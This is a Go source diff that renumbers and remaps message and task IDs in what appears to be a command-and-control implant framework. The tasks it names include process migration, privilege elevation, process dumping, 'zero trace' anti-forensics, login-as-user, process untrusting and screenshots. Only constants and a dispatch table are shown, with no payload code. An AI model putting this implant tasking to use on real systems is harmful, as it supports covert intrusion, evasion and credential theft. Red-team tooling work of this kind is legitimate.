@@ -26,12 +26,14 @@ const (
 	MvProxy   uint8 = 0x0B
 	MvSpawn   uint8 = 0x0C
 	MvMigrate uint8 = 0x0D
-	MvElevate uint8 = 0x0E
-	MvList    uint8 = 0x0F
-	MvMounts  uint8 = 0x10
-	MvRevSelf uint8 = 0x11
+	//MvElevate  uint8 = 0x0E
+	MvCheckDebug uint8 = 0x0E
+	MvList       uint8 = 0x0F
+	MvMounts     uint8 = 0x10
+	MvProcList   uint8 = 0x11
+	//MvRevSelf uint8 = 0x11
 	MvProfile uint8 = 0x12
-	MvScript  uint8 = 0xF0 // TODO(dij): setup
+	MvScript  uint8 = 0xF0
 
 	// Built in Task Message ID Values
 	TvDownload    uint8 = 0xC0
@@ -47,14 +49,19 @@ const (
 	TvRename      uint8 = 0xCA
 	TvScreenShot  uint8 = 0xCB
 	TvProcDump    uint8 = 0xCC
-	TvProcList    uint8 = 0xCD
-	TvRegistry    uint8 = 0xCE
-	TvSystemIO    uint8 = 0xCF
-	TvZeroTrace   uint8 = 0xD0
-	TvTroll       uint8 = 0xD1
-	TvUI          uint8 = 0xD2
-	TvWindowList  uint8 = 0xD3
-	TvLoginUser   uint8 = 0xD4
+	//TvProcList    uint8 = 0xCD
+	TvRevSelf    uint8 = 0xCD
+	TvRegistry   uint8 = 0xCE
+	TvSystemIO   uint8 = 0xCF
+	TvZeroTrace  uint8 = 0xD0
+	TvTroll      uint8 = 0xD1
+	TvUI         uint8 = 0xD2
+	TvWindowList uint8 = 0xD3
+	TvLoginUser  uint8 = 0xD4
+	// TvCheckDebug uint8 = 0xD5
+	TvElevate uint8 = 0xD5
+	TvWait    uint8 = 0xD6
+	TvUnTrust uint8 = 0xD7
 )
 
 // Mappings is an fixed size array that contains the Tasker mappings for each
@@ -76,14 +83,19 @@ var Mappings = [0xFF]Tasker{
 	TvRename:      taskRename,
 	TvScreenShot:  taskScreenShot,
 	TvProcDump:    taskProcDump,
-	TvProcList:    taskProcList,
-	TvRegistry:    taskRegistry,
-	TvSystemIO:    taskSystemIo,
-	TvZeroTrace:   taskZeroTrace,
-	TvTroll:       taskTroll,
-	TvUI:          taskInteract,
-	TvWindowList:  taskWindowList,
-	TvLoginUser:   taskLoginUser,
+	//TvProcList:    taskProcList,
+	TvRevSelf:    taskRevSelf,
+	TvRegistry:   taskRegistry,
+	TvSystemIO:   taskSystemIo,
+	TvZeroTrace:  taskZeroTrace,
+	TvTroll:      taskTroll,
+	TvUI:         taskInteract,
+	TvWindowList: taskWindowList,
+	TvLoginUser:  taskLoginUser,
+	//TvCheckDebug:  taskCheckDebug,
+	TvElevate: taskElevate,
+	TvWait:    taskWait,
+	TvUnTrust: taskUntrust,
 }
 
 // Tasklet is an interface that allows for Sessions to be directly tasked
